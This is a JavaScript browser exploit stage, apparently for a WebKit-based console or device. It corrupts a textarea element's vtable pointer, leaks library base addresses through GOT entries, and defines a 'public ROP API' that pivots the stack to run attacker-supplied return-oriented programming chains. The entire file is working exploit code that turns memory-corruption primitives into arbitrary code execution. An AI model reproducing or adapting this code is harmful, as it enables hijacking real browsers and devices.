var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705)-0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base+0x2e2c8;
var loadall_addr = libc_base+0x3275c;
var setjmp_addr = libc_base+0xbfae0;
var longjmp_addr = libc_base+0xbfb30;
var pivot_addr = libc_base+0x327d2;
var infloop_addr = libc_base+0x447a0;
var jop_frame_addr = libc_base+0x715d0;
var get_errno_addr_addr = libkernel_base+0x9ff0;
var pthread_create_addr = libkernel_base+0xf980;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    tarea.scrollLeft = 0;
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    tarea.scrollLeft = 0;
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
